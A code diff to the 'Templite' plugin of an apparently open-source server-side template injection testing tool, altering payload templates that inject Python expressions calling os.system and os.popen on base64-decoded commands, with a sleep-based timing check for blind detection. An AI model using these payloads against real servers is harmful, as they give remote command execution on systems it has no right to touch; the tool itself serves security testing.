@@ -43,7 +43,7 @@ class Templite(python.Python):
             },
             'evaluate_boolean': {
                 'call': 'inject',
-                'evaluate_blind': """${1}${1/0}_${str(1 / bool(eval(__import__('base64').urlsafe_b64decode('SSTIMAP:code:b64u;').decode())))}$"""
+                'evaluate_blind': """${1}${1/0}_${str(1/bool(eval(__import__('base64').urlsafe_b64decode('SSTIMAP:code:b64u;').decode())))}$"""
             },
             'evaluate_blind': {
                 'call': 'inject',
@@ -59,11 +59,11 @@ class Templite(python.Python):
             },
             'execute_boolean': {
                 'call': 'inject',
-                'execute_blind': """${1 / (__import__('os').system(__import__('base64').urlsafe_b64decode('SSTIMAP:code:b64u;').decode()) == 0)}$"""
+                'execute_blind': """${1/(__import__('os').system(__import__('base64').urlsafe_b64decode('SSTIMAP:code:b64u;').decode()) == 0)}$"""
             },
             'execute_blind': {
                 'call': 'inject',
-                'execute_blind': """${__import__('os').popen(__import__('base64').urlsafe_b64decode('SSTIMAP:code:b64u;').decode() + ' && sleep SSTIMAP:delay;').read()}$"""
+                'execute_blind': """${__import__('os').system(__import__('base64').urlsafe_b64decode('SSTIMAP:code:b64u;').decode())==0 and __import__('time').sleep(SSTIMAP:delay;)}$"""
             },
             'write': {
                 'call': 'inject',
